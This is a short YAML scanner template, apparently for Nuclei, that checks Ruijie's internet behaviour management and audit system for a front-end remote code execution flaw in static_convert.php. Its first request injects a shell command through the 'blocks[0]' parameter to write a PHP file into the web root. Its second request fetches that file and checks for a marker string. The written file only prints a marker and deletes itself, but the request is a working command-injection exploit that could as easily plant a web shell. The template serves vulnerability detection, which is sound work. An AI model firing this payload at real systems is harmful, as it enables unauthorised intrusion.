id: Ruijie_RG_UAC_RCE

info:
  name: 锐捷统一上网行为管理与审计系统 static_convert.php 前台RCE漏洞
  author: pitaya
  severity: high
  
variables:
  filename: "{{to_lower(rand_base(20))}}"
  
http:
  - raw:    
      - |
        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=|echo%20%27<?php%20echo%20SecExplorer666;unlink(__FILE__);?>%27%20>/var/www/html/{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        
      - |
        GET /{{filename}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36



    matchers:
      - type: dsl
        dsl:
          - status_code_2==200 && contains_all(body_2, "SecExplorer666")